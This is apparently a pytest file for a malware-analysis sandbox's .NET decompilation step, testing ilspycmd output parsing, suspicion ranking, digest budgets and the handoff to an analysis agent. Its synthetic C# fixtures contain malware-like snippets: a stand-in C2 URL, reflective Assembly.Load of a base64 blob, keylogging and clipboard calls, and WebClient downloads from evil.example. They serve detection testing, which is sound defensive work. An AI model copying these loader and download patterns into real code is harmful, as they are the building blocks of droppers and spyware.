""".NET decompile step (ilspycmd): parsing ILSpy's C#, ranking, the digest budget, the runner seam.

Synthetic C# only (written the way ilspycmd lays it out: one tab per level, braces on their own
lines). The real-tool test runs on the benign deploy/rea/fixtures/dotnet.dll and is skipped
where the .NET runtime / ilspycmd are not installed (outside the worker image).
"""

import json
import time
from pathlib import Path

import pytest

from blastbox.engines.rea import dotnet_decompile as dd
from blastbox.engines.rea import prompts
from blastbox.engines.rea import sweep as sw
from blastbox.engines.rea.continuation import State, unpack
from blastbox.engines.rea.runner import RunOutcome
from blastbox.limits import Limits
from tests.engines.test_rea_sweep import (  # noqa: F401  (_workdir is an autouse fixture)
    FakeGhidra,
    FakeUnpack,
    _codes,
    _fields,
    _iocs,
    _workdir,
    factory,
)

FIXTURES = Path(__file__).resolve().parents[2] / "deploy" / "rea" / "fixtures"
DLL = FIXTURES / "dotnet.dll"
NATIVE = FIXTURES / "sample.exe"

T = "\t"

SOURCE = "\n".join([
    "using System;",
    "using System.Reflection;",
    "",
    "[assembly: AssemblyTitle(\"x\")]",
    "internal class <Module>",
    "{",
    T + "static <Module>()",
    T + "{",
    T + T + "Decoder.Init();",
    T + "}",
    "}",
    "namespace Demo",
    "{",
    T + "internal static class Program",
    T + "{",
    T + T + "private static string host = \"http://c2.example/gate.php\";",
    "",
    T + T + "private static int port = 4782;",
    "",
    T + T + "private static byte[] key = new byte[4]",
    T + T + "{",
    T + T + T + "1, 2, 3, 4",
    T + T + "};",
    "",
    T + T + "[DllImport(\"kernel32.dll\")]",
    T + T + "private static extern IntPtr VirtualAlloc(IntPtr a, uint b, uint c, uint d);",
    "",
    T + T + "[STAThread]",
    T + T + "private static void Main(string[] args)",
    T + T + "{",
    T + T + T + "if (args.Length > 0)",
    T + T + T + "{",
    T + T + T + T + "Load();",
    T + T + T + "}",
    T + T + T + "Helper.Nothing();",
    T + T + "}",
    "",
    T + T + "private static void Load()",
    T + T + "{",
    T + T + T + "byte[] data = Convert.FromBase64String(\"" + "A" * 500 + "\");",
    T + T + T + "Assembly.Load(data).EntryPoint.Invoke(null, null);",
    T + T + "}",
    "",
    T + T + "public static int Count",
    T + T + "{",
    T + T + T + "get",
    T + T + T + "{",
    T + T + T + T + "return 1;",
    T + T + T + "}",
    T + T + "}",
    "",
    T + T + "static Program()",
    T + T + "{",
    T + T + T + "port = 1;",
    T + T + "}",
    T + "}",
    T + "public class MainForm : Form",
    T + "{",
    T + T + "public MainForm()",
    T + T + "{",
    T + T + T + "InitializeComponent();",
    T + T + "}",
    "",
    T + T + "private void InitializeComponent()",
    T + T + "{",
    T + T + T + "((Control)this).Text = \"Weather\";",
    T + T + "}",
    "",
    T + T + "protected override void Dispose(bool disposing)",
    T + T + "{",
    T + T + T + "base.Dispose(disposing);",
    T + T + "}",
    "",
    T + T + "private class Nested",
    T + T + "{",
    T + T + T + "public void Spy()",
    T + T + T + "{",
    T + T + T + T + "GetAsyncKeyState(1);",
    T + T + T + T + "Clipboard.GetText();",
    T + T + T + "}",
    T + T + "}",
    T + "}",
    T + "internal enum Mode",
    T + "{",
    T + T + "A,",
    T + T + "B = 2",
    T + "}",
    T + "public delegate void Callback(int x);",
    T + "internal static class Helper",
    T + "{",
    T + T + "public static void Nothing()",
    T + T + "{",
    T + T + "}",
    T + "}",
    "}",
    "namespace Demo.Properties",
    "{",
    T + "internal class Resources",
    T + "{",
    T + T + "internal static ResourceManager ResourceManager",
    T + T + "{",
    T + T + T + "get",
    T + T + T + "{",
    T + T + T + T + "return new ResourceManager(\"Demo.Properties.Resources\", typeof(Resources).Assembly);",
    T + T + T + "}",
    T + T + "}",
    T + "}",
    "}",
    "",
])

ENTRY = "\n".join([
    "using System;",
    "",
    "private static void Main(string[] args)",
    "{",
    T + "if (args.Length > 0)",
    T + "{",
    T + T + "Load();",
    T + "}",
    T + "Helper.Nothing();",
    "}",
    "",
])


def _members(members):
    return {(m.type, m.name): m for m in members}


# ------------------------------------------------------------------------ parse


def test_parse_types_members_and_counts():
    types, members, methods = dd.parse(SOURCE)
    names = {t.name: t.kind for t in types}
    assert names == {"<Module>": "class", "Demo.Program": "class", "Demo.MainForm": "class",
                     "Demo.MainForm.Nested": "class", "Demo.Mode": "enum", "Demo.Callback": "delegate",
                     "Demo.Helper": "class", "Demo.Properties.Resources": "class"}
    by = _members(members)
    assert by[("<Module>", ".cctor")].kind == "cctor"
    assert by[("Demo.Program", "Main")].kind == "method"
    assert by[("Demo.Program", "Count")].kind == "property"
    assert by[("Demo.Program", ".cctor")].kind == "cctor"
    assert by[("Demo.MainForm", ".ctor")].kind == "ctor"
    assert by[("Demo.MainForm.Nested", "Spy")].kind == "method"
    # field lines, including a field whose initializer spans braces, become one <fields> member
    fields = by[("Demo.Program", "<fields>")].code
    assert "c2.example" in fields and "1, 2, 3, 4" in fields and "};" in fields
    assert "VirtualAlloc" in by[("Demo.Program", "<extern>")].code
    assert "A," in by[("Demo.Mode", "<fields>")].code
    # Main, Load, .cctor x2, .ctor, InitializeComponent, Dispose, Spy, Nothing, extern VirtualAlloc
    assert methods == 10
    # attributes on members are dropped from the code; the method is whole
    main = by[("Demo.Program", "Main")].code
    assert main.startswith("private static void Main(string[] args)\n{") and main.endswith("}")
    assert "STAThread" not in main


def test_parse_noise_flags():
    types, members, _ = dd.parse(SOURCE)
    tn = {t.name: t.noise for t in types}
    assert tn["Demo.Properties.Resources"] and not tn["Demo.Program"] and not tn["<Module>"]
    by = _members(members)
    assert by[("Demo.MainForm", "InitializeComponent")].noise
    assert by[("Demo.MainForm", "Dispose")].noise
    assert not by[("Demo.Program", "Load")].noise


def test_parse_file_scoped_namespace_and_unclosed_tail():
    src = "namespace A.B;\n\ninternal class C\n{\n\tpublic void M()\n\t{\n\t\tFoo();\n"
    types, members, methods = dd.parse(src)
    assert [t.name for t in types] == ["A.B.C"]
    assert methods == 1 and members[0].name == "M" and "Foo();" in members[0].code


def test_parse_operator_indexer_event_generic():
    src = "\n".join([
        "public class G<T> : List<T> where T : class",
        "{",
        T + "public event EventHandler Changed;",
        T + "public T this[int i]",
        T + "{",
        T + T + "get",
        T + T + "{",
        T + T + T + "return default(T);",
        T + T + "}",
        T + "}",
        T + "public static G<T> operator +(G<T> a, G<T> b)",
        T + "{",
        T + T + "return a;",
        T + "}",
        T + "public U Map<U>(Func<T, U> f) where U : new()",
        T + "{",
        T + T + "return default(U);",
        T + "}",
        T + "public G(int x)",
        T + T + ": base(x)",
        T + "{",
        T + "}",
        "}",
    ])
    types, members, _ = dd.parse(src)
    assert types[0].name == "G<T>"
    kinds = {m.name: m.kind for m in members}
    assert kinds["this[]"] == "indexer" and kinds["operator +"] == "operator" and kinds["Map"] == "method"


# --------------------------------------------------------------------- strings


def test_clean_escapes_control_and_format_characters():
    s = dd.clean("a\x00b‮c​d\ne\tf", 100)
    assert s == "a\\u0000b\\u202ec\\u200bd\ne\tf"
    assert len(dd.clean("x" * 500, 50)) == 50


def test_long_literals_and_lines_are_cut():
    _, members, _ = dd.parse(SOURCE)
    load = _members(members)[("Demo.Program", "Load")].code
    assert "A" * 200 not in load and "chars)" in load
    assert all(len(line) <= dd.MAX_LINE for line in load.split("\n"))


def test_hostile_names_are_escaped():
    src = "namespace N‮\n{\n\tpublic class X​\x07\n\t{\n\t\tpublic void M\u0000()\n\t\t{\n\t\t}\n\t}\n}\n"
    types, members, _ = dd.parse(src)
    assert types[0].name == "N\\u202e.X\\u200b\\u0007"
    assert "\x00" not in members[0].name and "‮" not in members[0].type


# ----------------------------------------------------------------------- rank


def _decompiled(entry="Demo.Program.Main"):
    types, members, methods = dd.parse(SOURCE)
    return dd.Decompiled("ok", types=types, members=members, types_total=len(types), methods_total=methods,
                         source_chars=len(SOURCE), entry_point=entry)


def test_rank_entry_first_then_module_init_then_signals_noise_last():
    order = [(m.type, m.name, why) for m, why in dd.rank(_decompiled())]
    assert order[0][:2] == ("Demo.Program", "Main") and order[0][2][0] == "entry_point"
    assert order[1][:2] == ("<Module>", ".cctor") and order[1][2][0] == "module_initializer"
    assert order[2][:2] == ("Demo.Program", "Load")
    assert "called_from_entry" in order[2][2]
    assert any(w.startswith("loader:") for w in order[2][2]) and any(w.startswith("decrypt:") for w in order[2][2])
    names = [o[:2] for o in order]
    assert names.index(("Demo.MainForm.Nested", "Spy")) < names.index(("Demo.Helper", "Nothing"))
    tail = {o[:2] for o in order[-3:]}
    assert tail == {("Demo.MainForm", "InitializeComponent"), ("Demo.MainForm", "Dispose"),
                    ("Demo.Properties.Resources", "ResourceManager")}
    assert all(o[2][0] == "noise" for o in order[-3:])


def test_designer_code_with_behaviour_is_not_noise():
    src = SOURCE.replace("((Control)this).Text = \"Weather\";",
                         "Assembly.Load(Run(Resources.dzh)).GetTypes()[1].GetMethod(\"X\").Invoke(null, null);")
    types, members, methods = dd.parse(src)
    d = dd.Decompiled("ok", types=types, members=members, entry_point="Demo.Program.Main")
    order = [(m.name, why) for m, why in dd.rank(d)]
    pos = [n for n, _ in order].index("InitializeComponent")
    assert pos <= 3 and order[pos][1][0] == "in_designer_code"


def test_score_signals_table():
    m = dd.Member("T", "M", "method", "", 'new WebClient().DownloadString("https://evil.example/a");\n'
                                          'xmlns = "http://www.w3.org/2001/XMLSchema"; v = "Version=4.0.0.0";')
    s, why = dd.score(m)
    assert "network:WebClient" in why and "c2:https://evil.example/a" in why
    benign = dd.Member("T", "M", "method", "", 'x = "http://www.w3.org/2001/XMLSchema"; v = "1.0.0.0"; '
                                               'y = "Version=4.0.0.0";')
    assert dd.score(benign) == (0, [])
    assert dd.score(dd.Member("T", "M", "method", "", 'h = "203.0.113.9";'))[1] == ["c2:203.0.113.9"]


# --------------------------------------------------------------------- digest


def test_digest_shape_and_budget():
    g = dd.digest(_decompiled(), label="sample", budget_chars=30000)
    assert set(g) == {"label", "tool", "status", "types_total", "methods_total", "entry_point", "outline",
                      "excerpts", "omitted"}
    assert g["tool"] == f"ilspy {dd.ILSPY_VERSION}" and g["entry_point"] == "Demo.Program.Main"
    assert g["excerpts"][0]["member"] == "Main" and g["excerpts"][0]["why"][0] == "entry_point"
    assert all(set(e) == {"type", "member", "why", "code"} for e in g["excerpts"])
    assert g["omitted"] == 0 and len(json.dumps(g, ensure_ascii=False)) <= 30000
    assert not any("Resources" in line for line in g["outline"])
    assert not any("Callback" in line for line in g["outline"])  # delegates are not outlined


def test_digest_tight_budget_drops_noise_first_and_counts_omitted():
    big = SOURCE.replace("Helper.Nothing();", "Helper.Nothing();\n" + "\n".join(
        T + T + T + f"Console.WriteLine({i});" for i in range(300)))
    types, members, methods = dd.parse(big)
    d = dd.Decompiled("ok", types=types, members=members, entry_point="Demo.Program.Main")
    g = dd.digest(d, label="x", budget_chars=dd.MIN_BUDGET)
    size = len(json.dumps(g, ensure_ascii=False))
    assert size <= dd.MIN_BUDGET
    assert g["excerpts"] and g["excerpts"][0]["member"] == "Main"
    main = g["excerpts"][0]["code"]
    assert "[cut " in main or " lines]" in main  # a long method is cut to a share of the budget
    assert g["omitted"] == len(members) - len(g["excerpts"]) > 0
    assert not any(e["member"] in ("InitializeComponent", "Dispose") for e in g["excerpts"])


def test_digest_none_without_members():
    assert dd.digest(dd.Decompiled("failed", "x"), label="x", budget_chars=30000) is None


# -------------------------------------------------------------------- runner seam


class FakeRun:
    def __init__(self, main=RunOutcome(0, SOURCE.encode()), entry=RunOutcome(0, ENTRY.encode())):
        self.main, self.entry, self.calls = main, entry, []

    def __call__(self, argv, *, env, cwd, timeout_s, max_stdout):
        self.calls.append({"argv": argv, "env": env, "timeout_s": timeout_s, "max_stdout": max_stdout})
        return self.entry if "-m" in argv else self.main


@pytest.fixture
def tools(tmp_path):
    dotnet, ilspy = tmp_path / "dotnet", tmp_path / "ilspycmd.dll"
    dotnet.write_bytes(b"")
    ilspy.write_bytes(b"")
    return {"dotnet": str(dotnet), "ilspycmd": str(ilspy)}


def test_decompile_ok_entry_point_and_argv(tmp_path, tools):
    run = FakeRun()
    d = dd.decompile(DLL, tmp_path / "w", timeout_s=120, run=run, **tools)
    assert d.status == "ok" and d.reason == ""
    assert d.entry_point == "Demo.Program.Main" and d.entry_token is not None and d.entry_token >> 24 == 0x06
    assert d.types_total == 8 and d.methods_total == 10 and d.source_chars == len(SOURCE)
    main, entry = run.calls
    argv = main["argv"]
    assert argv[:2] == ["sh", "-c"] and "ulimit -v" in argv[2] and "ulimit -f" in argv[2]
    assert argv[6:10] == [tools["dotnet"], tools["ilspycmd"], "--disable-updatecheck", "-lv"]
    assert argv[-1] == str(DLL.resolve()) and "-p" not in argv and "-o" not in argv
    assert entry["argv"][-3:-1] == ["-m", f"{d.entry_token:#010x}"]
    env = main["env"]
    assert env["DOTNET_EnableDiagnostics"] == "0" and env["DOTNET_SYSTEM_GLOBALIZATION_INVARIANT"] == "1"
    assert env["DOTNET_gcServer"] == "0" and env["DOTNET_GCHeapHardLimit"].startswith("0x")
    assert env["HOME"].startswith(str(tmp_path)) and env["TMPDIR"].startswith(str(tmp_path))
    assert not any(k.startswith("REA_") or "KEY" in k for k in env)
    assert main["max_stdout"] == dd.MAX_SOURCE_BYTES


def test_decompile_entry_unmatched_is_none(tmp_path, tools):
    run = FakeRun(entry=RunOutcome(0, b"private void Elsewhere()\n{\n}\n"))
    assert dd.decompile(DLL, tmp_path / "w", timeout_s=120, run=run, **tools).entry_point is None


@pytest.mark.parametrize("outcome,status", [
    (RunOutcome(None, SOURCE[: len(SOURCE) // 2].encode(), timed_out=True), "timeout"),
    (RunOutcome(None, SOURCE[: len(SOURCE) // 2].encode(), capped=True), "too_large"),
])
def test_decompile_partial_output_is_kept(tmp_path, tools, outcome, status):
    d = dd.decompile(DLL, tmp_path / "w", timeout_s=120, run=FakeRun(main=outcome), **tools)
    assert d.status == status and d.reason and d.members  # what was read before the kill is parsed


def test_decompile_failures(tmp_path, tools):
    d = dd.decompile(DLL, tmp_path / "w", timeout_s=120, run=FakeRun(main=RunOutcome(70, b"")), **tools)
    assert (d.status, d.reason) == ("failed", "ilspycmd exit 70")
    d = dd.decompile(DLL, tmp_path / "w", timeout_s=120, run=FakeRun(main=RunOutcome(0, b"  \n")), **tools)
    assert (d.status, d.reason) == ("failed", "no output")

    def boom(*a, **k):
        raise OSError("spawn")

    assert dd.decompile(DLL, tmp_path / "w", timeout_s=120, run=boom, **tools).status == "failed"


def test_decompile_native_pe_is_refused_without_running(tmp_path, tools):
    run = FakeRun()
    d = dd.decompile(NATIVE, tmp_path / "w", timeout_s=120, run=run, **tools)
    assert d.status == "failed" and "not a .NET" in d.reason and run.calls == []


def test_decompile_unavailable(tmp_path):
    d = dd.decompile(DLL, tmp_path / "w", timeout_s=120, run=FakeRun(), dotnet=str(tmp_path / "none"))
    assert d.status == "unavailable"


def test_cli_header():
    flags, token = dd.cli_header(DLL)
    assert flags & 0x1 and token >> 24 == 0x06
    assert dd.cli_header(NATIVE) is None
    assert dd.cli_header(FIXTURES / "sample.elf") is None


def test_cli_header_truncated(tmp_path):
    p = tmp_path / "t.exe"
    p.write_bytes(DLL.read_bytes()[:300])
    assert dd.cli_header(p) is None


# --------------------------------------------------------------- real ilspycmd


@pytest.mark.skipif(not (Path(dd.DOTNET).is_file() and Path(dd.ILSPYCMD).is_file()),
                    reason="ilspycmd / .NET runtime not installed (worker image only)")
def test_real_ilspycmd_on_benign_fixture(tmp_path):
    d = dd.decompile(DLL, tmp_path / "w", timeout_s=120)
    assert d.status == "ok", d.reason
    assert d.entry_point == "Fixture.Program.Main"
    g = dd.digest(d, label="fixture", budget_chars=30000)
    assert [e["member"] for e in g["excerpts"][:2]] == ["Main", "LoadHidden"]
    why = g["excerpts"][1]["why"]
    assert any(w.startswith("loader:Assembly.Load") for w in why)
    assert any(w.startswith("resource:GetManifestResourceStream") for w in why)
    native = dd.decompile(NATIVE, tmp_path / "n", timeout_s=60)
    assert native.status == "failed"


def test_cut_keeps_signal_lines_of_a_long_designer_method():
    body = [T + f"((Control)label{i}).Text = \"x{i}\";" for i in range(800)]
    body.insert(790, T + "Assembly objectRef = Thread.GetDomain().Load(list.ToArray());")
    code = "\n".join(["private void InitializeComponent()", "{", *body, "}"])
    cut = dd._cut(code, 3000)
    assert len(cut) <= 3000 and "GetDomain().Load" in cut and "lines]" in cut
    assert cut.startswith("private void InitializeComponent()") and cut.endswith("}")
    m = dd.Member("F", "InitializeComponent", "method", "", code, noise=True)
    assert any(w.startswith("loader:") for w in dd.score(m)[1])


# ------------------------------------------------------------------ literals


def test_literals_are_whole_distinct_and_unescaped():
    src = 'a = "http://c2.example/a/very/long/path?x=1"; b = "tab\\tend"; c = "\\u0041bcd"; d = "abc"; ' \
          'e = "http://c2.example/a/very/long/path?x=1"; f = "q\\"uote";'
    assert dd.literals(src) == ["http://c2.example/a/very/long/path?x=1", "tab\tend", "Abcd", 'q"uote']


def test_literals_are_capped_in_count_and_length():
    src = "".join(f'x = "lit-{i:04d}";\n' for i in range(50)) + 'y = "' + "A" * (dd.MAX_LITERAL_CHARS + 50) + '";'
    assert dd.literals(src, limit=10) == [f"lit-{i:04d}" for i in range(10)]
    assert len(dd.literals(src)[-1]) == dd.MAX_LITERAL_CHARS


# --------------------------------------------------------------------- sweep


class FakeDecompile:
    """Stands in for dotnet_decompile.decompile: SOURCE parsed, or a fixed status."""

    def __init__(self, status="ok", raises=None, stage_status=None):
        self.status, self.raises, self.stage_status = status, raises, stage_status
        self.calls: list[dict] = []

    def __call__(self, image, workdir, *, timeout_s):
        self.calls.append(dict(image=image, workdir=workdir, timeout_s=timeout_s))
        if self.raises is not None:
            raise self.raises
        status = self.status if len(self.calls) == 1 or self.stage_status is None else self.stage_status
        if status in ("unavailable", "failed"):
            return dd.Decompiled(status, "ilspycmd exit 70")
        d = _decompiled()
        d.status, d.literals = status, dd.literals(SOURCE)
        return d


class StageDotnet:
    """Stands in for run_dotnet_resources: ``n`` hidden resources that each decode to a .NET stage."""

    def __init__(self, n=1, same=False):
        self.n, self.same = n, same

    def __call__(self, sample, outdir, timeout_s, **kw):
        outdir.mkdir(parents=True, exist_ok=True)
        hidden = []
        for i in range(self.n):
            (outdir / f"hidden-{i}.bin").write_bytes(b"\x00" * 64)
            (outdir / f"decoded-{i}.bin").write_bytes(DLL.read_bytes() + (b"" if self.same else bytes([i])))
            hidden.append({"resource": f"res{i}", "size": 64, "entropy": 7.9, "file": f"hidden-{i}.bin",
                           "decoded": "gzip", "decoded_file": f"decoded-{i}.bin",
                           "stage": {"dotnet": True, "module": f"Inner{i}.dll", "types": 3, "methods": 9,
                                     "loader_refs": []}})
        return "ok", json.dumps({"resources_total": self.n, "resources": [], "loader_refs": [],
                                 "hidden": hidden}).encode()


def _no_resources(sample, outdir, timeout_s, **kw):
    return "ok", json.dumps({"resources_total": 0, "resources": [], "loader_refs": [], "hidden": []}).encode()


def _srun(tmp_path, decompile, *, sample=DLL, dotnet=_no_resources, ghidra=None, limits=None):
    out = tmp_path / "out"
    out.mkdir(parents=True, exist_ok=True)
    ghidra = ghidra or FakeGhidra()
    eng = sw.ReaSweepEngine(runner_factory=factory(), ghidra_fn=ghidra, unpack_fn=FakeUnpack("failed"),
                            capa_fn=lambda *a, **k: ("ok", b'{"rules": {}}'), dotnet_fn=dotnet,
                            decompile_fn=decompile)
    return eng.detonate(sample, out, limits or Limits(timeout_s=600)), out, ghidra


def test_sweep_reads_a_dotnet_assembly_with_the_decompiler_and_skips_ghidra(tmp_path):
    fake = FakeDecompile()
    res, out, ghidra = _srun(tmp_path, fake)
    f = _fields(res)
    assert ghidra.calls == [] and f["ghidra_status"] == "skipped"
    assert f["decompile_status"] == "ok" and f["decompiled_images"] == 1
    assert f["more_pending"] is True and "chain_stop" not in f and not [c for c in _codes(res) if "decompile" in c]
    assert [c["image"] for c in fake.calls] == [DLL] and 0 < fake.calls[0]["timeout_s"] <= sw.DECOMPILE_S
    assert ("url", "http://c2.example/gate.php", "decompiled:sample") in _iocs(f)
    report = json.loads((out / "report.json").read_text())
    image, = report["decompiled"]["images"]
    assert image["label"] == "sample" and image["entry_point"] == "Demo.Program.Main" and image["excerpts"]
    assert "chain_stop" not in report
    _s, project, state = unpack(out / "continuation.tar.gz", tmp_path / "chk", max_bytes=1 << 26)
    assert project is None and state.ghidra_status == "skipped"
    assert state.sweep["decompiled"] == report["decompiled"]
    assert "decompiled" in prompts.evidence_sources(state.sweep)


@pytest.mark.parametrize("status", ["timeout", "too_large"])
def test_a_partial_decompile_is_still_read_with_a_warning(tmp_path, status):
    res, _out, ghidra = _srun(tmp_path, FakeDecompile(status))
    f = _fields(res)
    assert ghidra.calls == [] and f["decompile_status"] == status and f["decompiled_images"] == 1
    assert f"decompile_{status}" in _codes(res) and f["more_pending"] is True


@pytest.mark.parametrize("fake", [FakeDecompile("failed"), FakeDecompile(raises=OSError("boom"))])
def test_a_failed_decompile_falls_back_to_ghidra(tmp_path, fake):
    res, out, ghidra = _srun(tmp_path, fake)
    f = _fields(res)
    assert len(ghidra.calls) == 1 and f["ghidra_status"] == "ok"
    assert f["decompile_status"] == "failed" and f["decompiled_images"] == 0 and "decompile_failed" in _codes(res)
    assert json.loads((out / "report.json").read_text())["decompiled"] is None
    _s, project, state = unpack(out / "continuation.tar.gz", tmp_path / "chk", max_bytes=1 << 30)
    assert project is not None and "decompiled" not in state.sweep


def test_an_image_without_the_decompiler_changes_nothing(tmp_path):
    res, out, ghidra = _srun(tmp_path, FakeDecompile("unavailable"))
    f = _fields(res)
    assert len(ghidra.calls) == 1 and "decompile_status" not in f and "decompiled_images" not in f
    assert not [c for c in _codes(res) if "decompile" in c]
    assert json.loads((out / "report.json").read_text())["decompiled"] is None


def test_native_images_are_not_decompiled(tmp_path):
    fake = FakeDecompile()
    res, _out, ghidra = _srun(tmp_path, fake, sample=NATIVE)
    assert fake.calls == [] and len(ghidra.calls) == 1 and "decompile_status" not in _fields(res)


def test_recovered_dotnet_stages_are_decompiled_too(tmp_path):
    fake = FakeDecompile()
    res, out, _g = _srun(tmp_path, fake, dotnet=StageDotnet(2))
    f = _fields(res)
    assert f["decompiled_images"] == 3 and f["hidden_payloads"] == 2
    images = json.loads((out / "report.json").read_text())["decompiled"]["images"]
    assert [i["label"] for i in images] == ["sample", "stage Inner0.dll (member-1)", "stage Inner1.dll (member-3)"]
    assert [c["image"] for c in fake.calls[1:]] == [out / "members" / "member-1", out / "members" / "member-3"]
    assert len({c["workdir"] for c in fake.calls}) == 3
    assert ("url", "http://c2.example/gate.php", "decompiled:sample") in _iocs(f)  # first source wins


def test_stage_decompiles_are_capped_and_distinct(tmp_path):
    fake = FakeDecompile()
    res, _out, _g = _srun(tmp_path, fake, dotnet=StageDotnet(sw.MAX_DECOMPILE_STAGES + 2))
    assert len(fake.calls) == 1 + sw.MAX_DECOMPILE_STAGES
    assert _fields(res)["decompiled_images"] == 1 + sw.MAX_DECOMPILE_STAGES
    same = FakeDecompile()
    _srun(tmp_path / "b", same, dotnet=StageDotnet(3, same=True))
    assert len(same.calls) == 2


def test_stages_ride_along_when_the_assembly_itself_goes_to_ghidra(tmp_path):
    fake = FakeDecompile("failed", stage_status="ok")
    res, _out, ghidra = _srun(tmp_path, fake, dotnet=StageDotnet(1))
    f = _fields(res)
    assert len(ghidra.calls) == 1 and f["decompile_status"] == "failed" and f["decompiled_images"] == 1
    # ... and the stage keeps Ghidra's budget in reserve.
    assert fake.calls[1]["timeout_s"] <= 600 - sw.DEFAULT_GHIDRA_SWEEP_S


def test_no_time_left_is_a_timeout_not_a_run(tmp_path):
    fake = FakeDecompile("failed", stage_status="ok")
    res, _out, _g = _srun(tmp_path, fake, dotnet=StageDotnet(1), limits=Limits(timeout_s=sw.DEFAULT_GHIDRA_SWEEP_S))
    assert len(fake.calls) == 1 and "decompile_timeout" in _codes(res)
    assert _fields(res)["decompiled_images"] == 0


# ------------------------------------------------------------------- prompts


def test_the_report_prompt_explains_decompiled_code_and_still_formats():
    assert "sweep.decompiled" in prompts._REPORT_SWEEP
    assert "{" not in prompts._REPORT_SWEEP and "}" not in prompts._REPORT_SWEEP


def _first_message(sweep):
    st = State(pass_no=0, sample_name="a.exe", sample_sha256="0" * 64, program_name="a.exe", ghidra_status="ok",
               sweep=sweep)
    return prompts.Framer("n").initial_user_message(st, 1, todo=[], explored=[])["content"]


def test_the_agent_is_handed_the_decompiled_code():
    digest = dd.digest(_decompiled(), label="sample", budget_chars=4000)
    msg = _first_message({"decompiled": {"images": [digest]}})
    assert "ILSpy" in msg and "Demo.Program" in msg
    assert "ILSpy" not in _first_message({})


def test_the_agent_is_told_when_ghidra_cut_its_analysis_short():
    msg = _first_message({"ghidra_analysis": "cut"})
    assert "cut short" in msg and "not evidence" in msg
    assert "cut short" not in _first_message({})


# ------------------------------------------------------- hostile-size C# output


class Clock:
    """A clock that moves ``step`` seconds each time it is read."""

    def __init__(self, step=1.0):
        self.t, self.step = 0.0, step

    def __call__(self):
        self.t += self.step
        return self.t


@pytest.mark.parametrize("line,name", [
    ("public delegate void Callback(int x);", "Callback"),
    ("delegate void Bare();", "Bare"),
    ("internal unsafe delegate int* Reader(byte* p);", "Reader"),
    ("public delegate TResult Fn<in T, out TResult>(T arg);", "Fn"),
    ("private delegate (int, string) Pair(int a);", "Pair"),
    ("public delegate Dictionary<string, List<int>> Build(int n);", "Build"),
    ('public const string K = "a delegate void b(";', None),  # a field whose text mentions one
    ("public delegate void NoParens;", None),
    ("public delegate void Unfinished(int x)", None),
    ("public delegate a x< x< x< y(;", "y"),  # words with an unclosed "<" are passed over
    ("public delegate a x< x< x< y;", None),
    ("public delegate void " + "N" * dd.MAX_DECL_LINE + "(int x);", None),  # past the line cap
])
def test_a_delegate_line_names_the_type_it_declares(line, name):
    assert dd._delegate_name(line) == name


def test_long_lines_of_delegate_words_do_not_stall_the_parser():
    lit = "x delegate " * 8000  # one 88 KB line: 18.7 s under the regex search this replaced
    hostile = [T + "public delegate a " + "x< " * 1300 + ";"] * 300  # under the line cap, never closed
    src = "\n".join(["namespace N", "{", T + "public class C", T + "{",
                     T + T + f'public const string K = "{lit}";',
                     T + T + "public delegate void Inner(int x);", T + "}", *hostile,
                     T + "public delegate void After(int x);", "}", ""])
    t0 = time.monotonic()
    types, members, _ = dd.parse(src)
    assert time.monotonic() - t0 < 3
    assert {t.name: t.kind for t in types} == {"N.C": "class", "N.C.Inner": "delegate", "N.After": "delegate"}
    assert _members(members)[("N.C", "<fields>")].code.startswith('public const string K = "x delegate')


def _classes(n):
    """``n`` one-method classes in ILSpy's layout (seven lines each)."""
    out = ["namespace Many", "{"]
    for i in range(n):
        out += [T + f"public class C{i}", T + "{", T + T + f"public void M{i}()", T + T + "{",
                T + T + T + 'new WebClient().DownloadString("http://a.example/x");', T + T + "}", T + "}"]
    return "\n".join([*out, "}", ""])


def test_reading_a_runs_output_stops_at_its_time_budget_and_keeps_what_it_read(tmp_path, tools, monkeypatch):
    n = 4 * dd.PARSE_CHECK_LINES // 7 + 10  # more than four clock checks' worth of lines
    run = FakeRun(main=RunOutcome(0, _classes(n).encode()))
    whole = dd.decompile(DLL, tmp_path / "a", timeout_s=120, run=run, **tools)
    assert whole.status == "ok" and len(whole.members) == n and len(whole.scores) == n
    monkeypatch.setattr(dd, "_clock", Clock(dd.POST_S / 2.5))  # the third check is past the budget
    d = dd.decompile(DLL, tmp_path / "b", timeout_s=120, run=run, **tools)
    assert d.status == "timeout" and "stopped" in d.reason and str(int(dd.POST_S)) in d.reason
    assert 0 < len(d.members) < n and d.types_total == len(d.types) < n
    assert d.scores is not None and len(d.scores) <= len(d.members)
    g = dd.digest(d, label="sample", budget_chars=30000)
    assert g["status"] == "timeout" and g["omitted"] == len(d.members) - len(g["excerpts"])


def test_a_run_already_cut_short_says_so_when_reading_it_also_ran_out(tmp_path, tools, monkeypatch):
    n = 4 * dd.PARSE_CHECK_LINES // 7 + 10
    run = FakeRun(main=RunOutcome(None, _classes(n).encode(), capped=True))
    monkeypatch.setattr(dd, "_clock", Clock(dd.POST_S / 2.5))
    d = dd.decompile(DLL, tmp_path / "w", timeout_s=120, run=run, **tools)
    assert d.status == "too_large" and "MiB" in d.reason and "stopped" in d.reason


def test_scoring_stops_at_its_deadline_and_the_rest_rank_unscored(monkeypatch):
    _, members, _ = dd.parse(_classes(8))
    monkeypatch.setattr(dd, "_clock", Clock(1.0))
    scores = dd._scores(members, 3.5)
    assert len(scores) == 3 and all(s > 0 for s, _ in scores)
    d = dd.Decompiled("ok", members=members, scores=scores)
    ranked = dd.rank(d)
    assert [bool(why) for _, why in ranked] == [True] * 3 + [False] * 5
    assert len(dd._scores(members, None)) == 8


def test_a_digest_scores_each_member_once(tmp_path, tools, monkeypatch):
    calls = []
    real = dd.score
    monkeypatch.setattr(dd, "score", lambda m: calls.append(m) or real(m))
    by_hand = _decompiled()
    g = dd.digest(by_hand, label="sample", budget_chars=30000)
    assert len(calls) == len(by_hand.members)
    del calls[:]
    d = dd.decompile(DLL, tmp_path / "w", timeout_s=120, run=FakeRun(), **tools)
    assert len(calls) == len(d.members) == len(d.scores)  # scored in the run, under its budget
    assert dd.digest(d, label="sample", budget_chars=30000) == g and len(calls) == len(d.members)


def test_a_digest_past_its_deadline_stops_adding_excerpts(monkeypatch):
    d = _decompiled()
    d.scores = dd._scores(d.members, None)
    full = dd.digest(d, label="sample", budget_chars=30000)
    monkeypatch.setattr(dd, "_clock", Clock(1.0))
    g = dd.digest(d, label="sample", budget_chars=30000, deadline=2.5)
    assert g["excerpts"] == full["excerpts"][:2] and g["omitted"] == len(d.members) - 2
    assert g["outline"] == full["outline"]


def test_cutting_a_long_method_stops_looking_for_signals_at_its_deadline(monkeypatch):
